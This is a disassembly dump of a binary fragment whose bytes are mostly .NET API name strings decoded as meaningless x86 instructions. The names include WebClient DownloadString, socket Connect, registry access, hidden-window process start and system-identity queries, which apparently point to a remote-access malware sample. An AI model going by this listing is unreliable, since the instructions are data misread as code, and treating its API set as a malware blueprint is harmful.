  40963f:	43                   	inc    %ebx
  409640:	6c                   	insb   (%dx),%es:(%edi)
  409641:	65 61                	gs popa
  409643:	72 50                	jb     0x409695
  409645:	72 6f                	jb     0x4096b6
  409647:	6a 65                	push   $0x65
  409649:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  40964d:	72 6f                	jb     0x4096be
  40964f:	72 00                	jb     0x409651
  409651:	44                   	inc    %esp
  409652:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409659:	79 49                	jns    0x4096a4
  40965b:	6e                   	outsb  %ds:(%esi),(%dx)
  40965c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40965e:	00 67 65             	add    %ah,0x65(%edi)
  409661:	74 5f                	je     0x4096c2
  409663:	44                   	inc    %esp
  409664:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40966b:	79 00                	jns    0x40966d
  40966d:	67 65 74 5f          	addr16 gs je 0x4096d0
  409671:	46                   	inc    %esi
  409672:	75 6c                	jne    0x4096e0
  409674:	6c                   	insb   (%dx),%es:(%edi)
  409675:	4e                   	dec    %esi
  409676:	61                   	popa
  409677:	6d                   	insl   (%dx),%es:(%edi)
  409678:	65 00 44 69 72       	add    %al,%gs:0x72(%ecx,%ebp,2)
  40967d:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  409682:	79 00                	jns    0x409684
  409684:	45                   	inc    %ebp
  409685:	78 69                	js     0x4096f0
  409687:	73 74                	jae    0x4096fd
  409689:	73 00                	jae    0x40968b
  40968b:	43                   	inc    %ebx
  40968c:	72 65                	jb     0x4096f3
  40968e:	61                   	popa
  40968f:	74 65                	je     0x4096f6
  409691:	44                   	inc    %esp
  409692:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409699:	79 00                	jns    0x40969b
  40969b:	46                   	inc    %esi
  40969c:	69 6c 65 00 44 65 6c 	imul   $0x656c6544,0x0(%ebp,%eiz,2),%ebp
  4096a3:	65 
  4096a4:	74 65                	je     0x40970b
  4096a6:	00 52 65             	add    %dl,0x65(%edx)
  4096a9:	61                   	popa
  4096aa:	64 41                	fs inc %ecx
  4096ac:	6c                   	insb   (%dx),%es:(%edi)
  4096ad:	6c                   	insb   (%dx),%es:(%edi)
  4096ae:	42                   	inc    %edx
  4096af:	79 74                	jns    0x409725
  4096b1:	65 73 00             	gs jae 0x4096b4
  4096b4:	57                   	push   %edi
  4096b5:	72 69                	jb     0x409720
  4096b7:	74 65                	je     0x40971e
  4096b9:	41                   	inc    %ecx
  4096ba:	6c                   	insb   (%dx),%es:(%edi)
  4096bb:	6c                   	insb   (%dx),%es:(%edi)
  4096bc:	42                   	inc    %edx
  4096bd:	79 74                	jns    0x409733
  4096bf:	65 73 00             	gs jae 0x4096c2
  4096c2:	50                   	push   %eax
  4096c3:	72 6f                	jb     0x409734
  4096c5:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096c8:	73 57                	jae    0x409721
  4096ca:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4096d1:	79 6c                	jns    0x40973f
  4096d3:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4096d7:	74 5f                	je     0x409738
  4096d9:	57                   	push   %edi
  4096da:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4096e1:	79 6c                	jns    0x40974f
  4096e3:	65 00 54 6f 42       	add    %dl,%gs:0x42(%edi,%ebp,2)
  4096e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4096e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4096ea:	6c                   	insb   (%dx),%es:(%edi)
  4096eb:	65 61                	gs popa
  4096ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ee:	00 50 61             	add    %dl,0x61(%eax)
  4096f1:	74 68                	je     0x40975b
  4096f3:	00 47 65             	add    %al,0x65(%edi)
  4096f6:	74 46                	je     0x40973e
  4096f8:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  4096ff:	57 
  409700:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  409707:	78 
  409708:	74 65                	je     0x40976f
  40970a:	6e                   	outsb  %ds:(%esi),(%dx)
  40970b:	73 69                	jae    0x409776
  40970d:	6f                   	outsl  %ds:(%esi),(%dx)
  40970e:	6e                   	outsb  %ds:(%esi),(%dx)
  40970f:	00 73 65             	add    %dh,0x65(%ebx)
  409712:	74 5f                	je     0x409773
  409714:	41                   	inc    %ecx
  409715:	72 67                	jb     0x40977e
  409717:	75 6d                	jne    0x409786
  409719:	65 6e                	outsb  %gs:(%esi),(%dx)
  40971b:	74 73                	je     0x409790
  40971d:	00 53 74             	add    %dl,0x74(%ebx)
  409720:	61                   	popa
  409721:	72 74                	jb     0x409797
  409723:	00 57 61             	add    %dl,0x61(%edi)
  409726:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  40972d:	69 
  40972e:	74 00                	je     0x409730
  409730:	53                   	push   %ebx
  409731:	65 72 76             	gs jb  0x4097aa
  409734:	65 72 43             	gs jb  0x40977a
  409737:	6f                   	outsl  %ds:(%esi),(%dx)
  409738:	6d                   	insl   (%dx),%es:(%edi)
  409739:	70 75                	jo     0x4097b0
  40973b:	74 65                	je     0x4097a2
  40973d:	72 00                	jb     0x40973f
  40973f:	4d                   	dec    %ebp
  409740:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409747:	74 2e                	je     0x409777
  409749:	56                   	push   %esi
  40974a:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  409751:	73 69                	jae    0x4097bc
  409753:	63 2e                	arpl   %ebp,(%esi)
  409755:	4d                   	dec    %ebp
  409756:	79 53                	jns    0x4097ab
  409758:	65 72 76             	gs jb  0x4097d1
  40975b:	69 63 65 73 00 52 65 	imul   $0x65520073,0x65(%ebx),%esp
  409762:	67 69 73 74 72 79 50 	imul   $0x72507972,0x74(%bp,%di),%esi
  409769:	72 
  40976a:	6f                   	outsl  %ds:(%esi),(%dx)
  40976b:	78 79                	js     0x4097e6
  40976d:	00 67 65             	add    %ah,0x65(%edi)
  409770:	74 5f                	je     0x4097d1
  409772:	52                   	push   %edx
  409773:	65 67 69 73 74 72 79 	imul   $0x52007972,%gs:0x74(%bp,%di),%esi
  40977a:	00 52 
  40977c:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409783:	4b 65 
  409785:	79 00                	jns    0x409787
  409787:	67 65 74 5f          	addr16 gs je 0x4097ea
  40978b:	43                   	inc    %ebx
  40978c:	75 72                	jne    0x409800
  40978e:	72 65                	jb     0x4097f5
  409790:	6e                   	outsb  %ds:(%esi),(%dx)
  409791:	74 55                	je     0x4097e8
  409793:	73 65                	jae    0x4097fa
  409795:	72 00                	jb     0x409797
  409797:	4f                   	dec    %edi
  409798:	70 65                	jo     0x4097ff
  40979a:	6e                   	outsb  %ds:(%esi),(%dx)
  40979b:	53                   	push   %ebx
  40979c:	75 62                	jne    0x409800
  40979e:	4b                   	dec    %ebx
  40979f:	65 79 00             	gs jns 0x4097a2
  4097a2:	53                   	push   %ebx
  4097a3:	70 65                	jo     0x40980a
  4097a5:	63 69 61             	arpl   %ebp,0x61(%ecx)
  4097a8:	6c                   	insb   (%dx),%es:(%edi)
  4097a9:	46                   	inc    %esi
  4097aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ab:	6c                   	insb   (%dx),%es:(%edi)
  4097ac:	64 65 72 00          	fs gs jb 0x4097b0
  4097b0:	47                   	inc    %edi
  4097b1:	65 74 46             	gs je  0x4097fa
  4097b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4097b5:	6c                   	insb   (%dx),%es:(%edi)
  4097b6:	64 65 72 50          	fs gs jb 0x40980a
  4097ba:	61                   	popa
  4097bb:	74 68                	je     0x409825
  4097bd:	00 43 72             	add    %al,0x72(%ebx)
  4097c0:	65 61                	gs popa
  4097c2:	74 65                	je     0x409829
  4097c4:	4f                   	dec    %edi
  4097c5:	62 6a 65             	bound  %ebp,0x65(%edx)
  4097c8:	63 74 00 42          	arpl   %esi,0x42(%eax,%eax,1)
  4097cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4097cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ce:	6c                   	insb   (%dx),%es:(%edi)
  4097cf:	65 61                	gs popa
  4097d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d2:	00 4e 65             	add    %cl,0x65(%esi)
  4097d5:	77 4c                	ja     0x409823
  4097d7:	61                   	popa
  4097d8:	74 65                	je     0x40983f
  4097da:	42                   	inc    %edx
  4097db:	69 6e 64 69 6e 67 00 	imul   $0x676e69,0x64(%esi),%ebp
  4097e2:	4c                   	dec    %esp
  4097e3:	61                   	popa
  4097e4:	74 65                	je     0x40984b
  4097e6:	47                   	inc    %edi
  4097e7:	65 74 00             	gs je  0x4097ea
  4097ea:	43                   	inc    %ebx
  4097eb:	68 61 6e 67 65       	push   $0x65676e61
  4097f0:	54                   	push   %esp
  4097f1:	79 70                	jns    0x409863
  4097f3:	65 00 4c 61 74       	add    %cl,%gs:0x74(%ecx,%eiz,2)
  4097f8:	65 53                	gs push %ebx
  4097fa:	65 74 43             	gs je  0x409840
  4097fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4097fe:	6d                   	insl   (%dx),%es:(%edi)
  4097ff:	70 6c                	jo     0x40986d
  409801:	65 78 00             	gs js  0x409804
  409804:	4c                   	dec    %esp
  409805:	61                   	popa
  409806:	74 65                	je     0x40986d
  409808:	43                   	inc    %ebx
  409809:	61                   	popa
  40980a:	6c                   	insb   (%dx),%es:(%edi)
  40980b:	6c                   	insb   (%dx),%es:(%edi)
  40980c:	00 46 69             	add    %al,0x69(%esi)
  40980f:	6c                   	insb   (%dx),%es:(%edi)
  409810:	65 4d                	gs dec %ebp
  409812:	6f                   	outsl  %ds:(%esi),(%dx)
  409813:	64 65 00 54 68 72    	fs add %dl,%gs:0x72(%eax,%ebp,2)
  409819:	65 61                	gs popa
  40981b:	64 53                	fs push %ebx
  40981d:	74 61                	je     0x409880
  40981f:	72 74                	jb     0x409895
  409821:	00 4a 6f             	add    %cl,0x6f(%edx)
  409824:	69 6e 00 73 65 74 5f 	imul   $0x5f746573,0x0(%esi),%ebp
  40982b:	46                   	inc    %esi
  40982c:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  409833:	00 
  409834:	47                   	inc    %edi
  409835:	65 74 43             	gs je  0x40987b
  409838:	75 72                	jne    0x4098ac
  40983a:	72 65                	jb     0x4098a1
  40983c:	6e                   	outsb  %ds:(%esi),(%dx)
  40983d:	74 50                	je     0x40988f
  40983f:	72 6f                	jb     0x4098b0
  409841:	63 65 73             	arpl   %esp,0x73(%ebp)
  409844:	73 00                	jae    0x409846
  409846:	50                   	push   %eax
  409847:	72 6f                	jb     0x4098b8
  409849:	63 65 73             	arpl   %esp,0x73(%ebp)
  40984c:	73 4d                	jae    0x40989b
  40984e:	6f                   	outsl  %ds:(%esi),(%dx)
  40984f:	64 75 6c             	fs jne 0x4098be
  409852:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409856:	74 5f                	je     0x4098b7
  409858:	4d                   	dec    %ebp
  409859:	61                   	popa
  40985a:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  409861:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409865:	74 5f                	je     0x4098c6
  409867:	4d                   	dec    %ebp
  409868:	6f                   	outsl  %ds:(%esi),(%dx)
  409869:	64 75 6c             	fs jne 0x4098d8
  40986c:	65 4e                	gs dec %esi
  40986e:	61                   	popa
  40986f:	6d                   	insl   (%dx),%es:(%edi)
  409870:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  409874:	74 46                	je     0x4098bc
  409876:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40987d:	00 
  40987e:	46                   	inc    %esi
  40987f:	61                   	popa
  409880:	69 6c 46 61 73 74 00 	imul   $0x53007473,0x61(%esi,%eax,2),%ebp
  409887:	53 
  409888:	79 73                	jns    0x4098fd
  40988a:	74 65                	je     0x4098f1
  40988c:	6d                   	insl   (%dx),%es:(%edi)
  40988d:	2e 4e                	cs dec %esi
  40988f:	65 74 00             	gs je  0x409892
  409892:	57                   	push   %edi
  409893:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409897:	69 65 6e 74 00 44 6f 	imul   $0x6f440074,0x6e(%ebp),%esp
  40989e:	77 6e                	ja     0x40990e
  4098a0:	6c                   	insb   (%dx),%es:(%edi)
  4098a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4098a2:	61                   	popa
  4098a3:	64 53                	fs push %ebx
  4098a5:	74 72                	je     0x409919
  4098a7:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  4098ae:	74 61                	je     0x409911
  4098b0:	69 6e 73 00 43 6f 6d 	imul   $0x6d6f4300,0x73(%esi),%ebp
  4098b7:	70 75                	jo     0x40992e
  4098b9:	74 65                	je     0x409920
  4098bb:	72 49                	jb     0x409906
  4098bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4098be:	66 6f                	outsw  %ds:(%esi),(%dx)
  4098c0:	00 67 65             	add    %ah,0x65(%edi)
  4098c3:	74 5f                	je     0x409924
  4098c5:	4f                   	dec    %edi
  4098c6:	53                   	push   %ebx
  4098c7:	46                   	inc    %esi
  4098c8:	75 6c                	jne    0x409936
  4098ca:	6c                   	insb   (%dx),%es:(%edi)
  4098cb:	4e                   	dec    %esi
  4098cc:	61                   	popa
  4098cd:	6d                   	insl   (%dx),%es:(%edi)
  4098ce:	65 00 54 6f 4c       	add    %dl,%gs:0x4c(%edi,%ebp,2)
  4098d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4098d4:	77 65                	ja     0x40993b
  4098d6:	72 00                	jb     0x4098d8
  4098d8:	53                   	push   %ebx
  4098d9:	79 73                	jns    0x40994e
  4098db:	74 65                	je     0x409942
  4098dd:	6d                   	insl   (%dx),%es:(%edi)
  4098de:	2e 43                	cs inc %ebx
  4098e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4098e1:	6c                   	insb   (%dx),%es:(%edi)
  4098e2:	6c                   	insb   (%dx),%es:(%edi)
  4098e3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4098e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4098e9:	73 00                	jae    0x4098eb
  4098eb:	49                   	dec    %ecx
  4098ec:	45                   	inc    %ebp
  4098ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ee:	75 6d                	jne    0x40995d
  4098f0:	65 72 61             	gs jb  0x409954
  4098f3:	74 6f                	je     0x409964
  4098f5:	72 00                	jb     0x4098f7
  4098f7:	53                   	push   %ebx
  4098f8:	79 73                	jns    0x40996d
  4098fa:	74 65                	je     0x409961
  4098fc:	6d                   	insl   (%dx),%es:(%edi)
  4098fd:	2e 4d                	cs dec %ebp
  4098ff:	61                   	popa
  409900:	6e                   	outsb  %ds:(%esi),(%dx)
  409901:	61                   	popa
  409902:	67 65 6d             	gs insl (%dx),%es:(%di)
  409905:	65 6e                	outsb  %gs:(%esi),(%dx)
  409907:	74 00                	je     0x409909
  409909:	4d                   	dec    %ebp
  40990a:	61                   	popa
  40990b:	6e                   	outsb  %ds:(%esi),(%dx)
  40990c:	61                   	popa
  40990d:	67 65 6d             	gs insl (%dx),%es:(%di)
  409910:	65 6e                	outsb  %gs:(%esi),(%dx)
  409912:	74 4f                	je     0x409963
  409914:	62 6a 65             	bound  %ebp,0x65(%edx)
  409917:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  40991b:	61                   	popa
  40991c:	72 63                	jb     0x409981
  40991e:	68 65 72 00 49       	push   $0x49007265
  409923:	45                   	inc    %ebp
  409924:	6e                   	outsb  %ds:(%esi),(%dx)
  409925:	75 6d                	jne    0x409994
  409927:	65 72 61             	gs jb  0x40998b
  40992a:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40992e:	47                   	inc    %edi
  40992f:	65 74 45             	gs je  0x409977
  409932:	6e                   	outsb  %ds:(%esi),(%dx)
  409933:	75 6d                	jne    0x4099a2
  409935:	65 72 61             	gs jb  0x409999
  409938:	74 6f                	je     0x4099a9
  40993a:	72 00                	jb     0x40993c
  40993c:	67 65 74 5f          	addr16 gs je 0x40999f
  409940:	43                   	inc    %ebx
  409941:	75 72                	jne    0x4099b5
  409943:	72 65                	jb     0x4099aa
  409945:	6e                   	outsb  %ds:(%esi),(%dx)
  409946:	74 00                	je     0x409948
  409948:	4c                   	dec    %esp
  409949:	61                   	popa
  40994a:	74 65                	je     0x4099b1
  40994c:	49                   	dec    %ecx
  40994d:	6e                   	outsb  %ds:(%esi),(%dx)
  40994e:	64 65 78 47          	fs gs js 0x409999
  409952:	65 74 00             	gs je  0x409955
  409955:	4f                   	dec    %edi
  409956:	70 65                	jo     0x4099bd
  409958:	72 61                	jb     0x4099bb
  40995a:	74 6f                	je     0x4099cb
  40995c:	72 73                	jb     0x4099d1
  40995e:	00 43 6f             	add    %al,0x6f(%ebx)
  409961:	6d                   	insl   (%dx),%es:(%edi)
  409962:	70 61                	jo     0x4099c5
  409964:	72 65                	jb     0x4099cb
  409966:	53                   	push   %ebx
  409967:	74 72                	je     0x4099db
  409969:	69 6e 67 00 54 6f 55 	imul   $0x556f5400,0x67(%esi),%ebp
  409970:	70 70                	jo     0x4099e2
  409972:	65 72 49             	gs jb  0x4099be
  409975:	6e                   	outsb  %ds:(%esi),(%dx)
  409976:	76 61                	jbe    0x4099d9
  409978:	72 69                	jb     0x4099e3
  40997a:	61                   	popa
  40997b:	6e                   	outsb  %ds:(%esi),(%dx)
  40997c:	74 00                	je     0x40997e
  40997e:	4d                   	dec    %ebp
  40997f:	6f                   	outsl  %ds:(%esi),(%dx)
  409980:	76 65                	jbe    0x4099e7
  409982:	4e                   	dec    %esi
  409983:	65 78 74             	gs js  0x4099fa
  409986:	00 49 44             	add    %cl,0x44(%ecx)
  409989:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  409990:	6c                   	insb   (%dx),%es:(%edi)
  409991:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  409996:	70 6f                	jo     0x409a07
  409998:	73 65                	jae    0x4099ff
  40999a:	00 67 65             	add    %ah,0x65(%edi)
  40999d:	74 5f                	je     0x4099fe
  40999f:	48                   	dec    %eax
  4099a0:	61                   	popa
  4099a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4099a2:	64 6c                	fs insb (%dx),%es:(%edi)
  4099a4:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  4099a8:	74 50                	je     0x4099fa
  4099aa:	74 72                	je     0x409a1e
  4099ac:	00 54 6f 49          	add    %dl,0x49(%edi,%ebp,2)
  4099b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b1:	74 33                	je     0x4099e6
  4099b3:	32 00                	xor    (%eax),%al
  4099b5:	4e                   	dec    %esi
  4099b6:	65 78 74             	gs js  0x409a2d
  4099b9:	00 57 61             	add    %dl,0x61(%edi)
  4099bc:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  4099c3:	65 
  4099c4:	00 57 61             	add    %dl,0x61(%edi)
  4099c7:	69 74 4f 6e 65 00 53 	imul   $0x54530065,0x6e(%edi,%ecx,2),%esi
  4099ce:	54 
  4099cf:	41                   	inc    %ecx
  4099d0:	54                   	push   %esp
  4099d1:	68 72 65 61 64       	push   $0x64616572
  4099d6:	41                   	inc    %ecx
  4099d7:	74 74                	je     0x409a4d
  4099d9:	72 69                	jb     0x409a44
  4099db:	62 75 74             	bound  %esi,0x74(%ebp)
  4099de:	65 00 44 6c 6c       	add    %al,%gs:0x6c(%esp,%ebp,2)
  4099e3:	49                   	dec    %ecx
  4099e4:	6d                   	insl   (%dx),%es:(%edi)
  4099e5:	70 6f                	jo     0x409a56
  4099e7:	72 74                	jb     0x409a5d
  4099e9:	41                   	inc    %ecx
  4099ea:	74 74                	je     0x409a60
  4099ec:	72 69                	jb     0x409a57
  4099ee:	62 75 74             	bound  %esi,0x74(%ebp)
  4099f1:	65 00 6b 65          	add    %ch,%gs:0x65(%ebx)
  4099f5:	72 6e                	jb     0x409a65
  4099f7:	65 6c                	gs insb (%dx),%es:(%edi)
  4099f9:	33 32                	xor    (%edx),%esi
  4099fb:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4099fe:	6c                   	insb   (%dx),%es:(%edi)
  4099ff:	00 5f 4c             	add    %bl,0x4c(%edi)
  409a02:	61                   	popa
  409a03:	6d                   	insl   (%dx),%es:(%edi)
  409a04:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  409a08:	5f                   	pop    %edi
  409a09:	5f                   	pop    %edi
  409a0a:	34 00                	xor    $0x0,%al
  409a0c:	61                   	popa
  409a0d:	30 00                	xor    %al,(%eax)
  409a0f:	5f                   	pop    %edi
  409a10:	4c                   	dec    %esp
  409a11:	61                   	popa
  409a12:	6d                   	insl   (%dx),%es:(%edi)
  409a13:	62 64 61 24          	bound  %esp,0x24(%ecx,%eiz,2)
  409a17:	5f                   	pop    %edi
  409a18:	5f                   	pop    %edi
  409a19:	35 00 49 50 41       	xor    $0x41504900,%eax
  409a1e:	64 64 72 65          	fs fs jb 0x409a87
  409a22:	73 73                	jae    0x409a97
  409a24:	00 43 68             	add    %al,0x68(%ebx)
  409a27:	61                   	popa
  409a28:	72 00                	jb     0x409a2a
  409a2a:	53                   	push   %ebx
  409a2b:	70 6c                	jo     0x409a99
  409a2d:	69 74 00 44 6e 73 00 	imul   $0x4700736e,0x44(%eax,%eax,1),%esi
  409a34:	47 
  409a35:	65 74 48             	gs je  0x409a80
  409a38:	6f                   	outsl  %ds:(%esi),(%dx)
  409a39:	73 74                	jae    0x409aaf
  409a3b:	41                   	inc    %ecx
  409a3c:	64 64 72 65          	fs fs jb 0x409aa5
  409a40:	73 73                	jae    0x409ab5
  409a42:	65 73 00             	gs jae 0x409a45
  409a45:	54                   	push   %esp
  409a46:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  409a4d:	6c                   	insb   (%dx),%es:(%edi)
  409a4e:	62 61 63             	bound  %esp,0x63(%ecx)
  409a51:	6b 00 41             	imul   $0x41,(%eax),%eax
  409a54:	64 64 72 65          	fs fs jb 0x409abd
  409a58:	73 73                	jae    0x409acd
  409a5a:	46                   	inc    %esi
  409a5b:	61                   	popa
  409a5c:	6d                   	insl   (%dx),%es:(%edi)
  409a5d:	69 6c 79 00 53 6f 63 	imul   $0x6b636f53,0x0(%ecx,%edi,2),%ebp
  409a64:	6b 
  409a65:	65 74 54             	gs je  0x409abc
  409a68:	79 70                	jns    0x409ada
  409a6a:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  409a6e:	6f                   	outsl  %ds:(%esi),(%dx)
  409a6f:	74 6f                	je     0x409ae0
  409a71:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409a74:	54                   	push   %esp
  409a75:	79 70                	jns    0x409ae7
  409a77:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  409a7b:	74 65                	je     0x409ae2
  409a7d:	00 73 65             	add    %dh,0x65(%ebx)
  409a80:	74 5f                	je     0x409ae1
  409a82:	52                   	push   %edx
  409a83:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  409a87:	76 65                	jbe    0x409aee
  409a89:	42                   	inc    %edx
  409a8a:	75 66                	jne    0x409af2
  409a8c:	66 65 72 53          	data16 gs jb 0x409ae3
  409a90:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  409a97:	5f                   	pop    %edi
  409a98:	53                   	push   %ebx
  409a99:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a9b:	64 42                	fs inc %edx
  409a9d:	75 66                	jne    0x409b05
  409a9f:	66 65 72 53          	data16 gs jb 0x409af6
  409aa3:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  409aaa:	6e                   	outsb  %ds:(%esi),(%dx)
  409aab:	65 63 74 00 53       	arpl   %esi,%gs:0x53(%eax,%eax,1)
  409ab0:	6f                   	outsl  %ds:(%esi),(%dx)
  409ab1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409ab4:	74 46                	je     0x409afc
  409ab6:	6c                   	insb   (%dx),%es:(%edi)
  409ab7:	61                   	popa
  409ab8:	67 73 00             	addr16 jae 0x409abb
  409abb:	45                   	inc    %ebp
  409abc:	76 65                	jbe    0x409b23
  409abe:	6e                   	outsb  %ds:(%esi),(%dx)
  409abf:	74 57                	je     0x409b18
  409ac1:	61                   	popa
  409ac2:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  409ac9:	65 
  409aca:	00 53 65             	add    %dl,0x65(%ebx)
  409acd:	74 00                	je     0x409acf
  409acf:	67 65 74 5f          	addr16 gs je 0x409b32
  409ad3:	55                   	push   %ebp
  409ad4:	73 65                	jae    0x409b3b
  409ad6:	72 4e                	jb     0x409b26
  409ad8:	61                   	popa
  409ad9:	6d                   	insl   (%dx),%es:(%edi)
  409ada:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  409ade:	70 6c                	jo     0x409b4c
  409ae0:	61                   	popa
  409ae1:	63 65 00             	arpl   %esp,0x0(%ebp)
  409ae4:	4f                   	dec    %edi
  409ae5:	70 65                	jo     0x409b4c
  409ae7:	72 61                	jb     0x409b4a
  409ae9:	74 69                	je     0x409b54
  409aeb:	6e                   	outsb  %ds:(%esi),(%dx)
  409aec:	67 53                	addr16 push %ebx
  409aee:	79 73                	jns    0x409b63
  409af0:	74 65                	je     0x409b57
  409af2:	6d                   	insl   (%dx),%es:(%edi)
  409af3:	00 67 65             	add    %ah,0x65(%edi)
  409af6:	74 5f                	je     0x409b57
  409af8:	4f                   	dec    %edi
  409af9:	53                   	push   %ebx
  409afa:	56                   	push   %esi
  409afb:	65 72 73             	gs jb  0x409b71
  409afe:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  409b05:	5f                   	pop    %edi
  409b06:	53                   	push   %ebx
  409b07:	65 72 76             	gs jb  0x409b80
  409b0a:	69 63 65 50 61 63 6b 	imul   $0x6b636150,0x65(%ebx),%esp
  409b11:	00 67 65             	add    %ah,0x65(%edi)
  409b14:	74 5f                	je     0x409b75
  409b16:	49                   	dec    %ecx
  409b17:	73 36                	jae    0x409b4f
  409b19:	34 42                	xor    $0x42,%al
  409b1b:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  409b22:	74 
  409b23:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  409b2a:	65 6d                	gs insl (%dx),%es:(%edi)
  409b2c:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  409b30:	65 54                	gs push %esp
  409b32:	69 6d 65 00 46 69 6c 	imul   $0x6c694600,0x65(%ebp),%ebp
  409b39:	65 53                	gs push %ebx
  409b3b:	79 73                	jns    0x409bb0
  409b3d:	74 65                	je     0x409ba4
  409b3f:	6d                   	insl   (%dx),%es:(%edi)
  409b40:	49                   	dec    %ecx
  409b41:	6e                   	outsb  %ds:(%esi),(%dx)
  409b42:	66 6f                	outsw  %ds:(%esi),(%dx)
  409b44:	00 67 65             	add    %ah,0x65(%edi)
  409b47:	74 5f                	je     0x409ba8
  409b49:	4c                   	dec    %esp
  409b4a:	61                   	popa
  409b4b:	73 74                	jae    0x409bc1
  409b4d:	57                   	push   %edi
  409b4e:	72 69                	jb     0x409bb9
  409b50:	74 65                	je     0x409bb7
  409b52:	54                   	push   %esp
  409b53:	69 6d 65 00 53 79 73 	imul   $0x73795300,0x65(%ebp),%ebp
  409b5a:	74 65                	je     0x409bc1
  409b5c:	6d                   	insl   (%dx),%es:(%edi)
  409b5d:	2e 53                	cs push %ebx
  409b5f:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409b63:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  409b6a:	6e 
  409b6b:	63 69 70             	arpl   %ebp,0x70(%ecx)
  409b6e:	61                   	popa
  409b6f:	6c                   	insb   (%dx),%es:(%edi)
  409b70:	00 57 69             	add    %dl,0x69(%edi)
  409b73:	6e                   	outsb  %ds:(%esi),(%dx)
  409b74:	64 6f                	outsl  %fs:(%esi),(%dx)
  409b76:	77 73                	ja     0x409beb
  409b78:	49                   	dec    %ecx
  409b79:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409b7c:	74 69                	je     0x409be7
  409b7e:	74 79                	je     0x409bf9
  409b80:	00 47 65             	add    %al,0x65(%edi)
  409b83:	74 43                	je     0x409bc8
  409b85:	75 72                	jne    0x409bf9
  409b87:	72 65                	jb     0x409bee
  409b89:	6e                   	outsb  %ds:(%esi),(%dx)
  409b8a:	74 00                	je     0x409b8c
  409b8c:	57                   	push   %edi
  409b8d:	69 6e 64 6f 77 73 50 	imul   $0x5073776f,0x64(%esi),%ebp
  409b94:	72 69                	jb     0x409bff
  409b96:	6e                   	outsb  %ds:(%esi),(%dx)
  409b97:	63 69 70             	arpl   %ebp,0x70(%ecx)
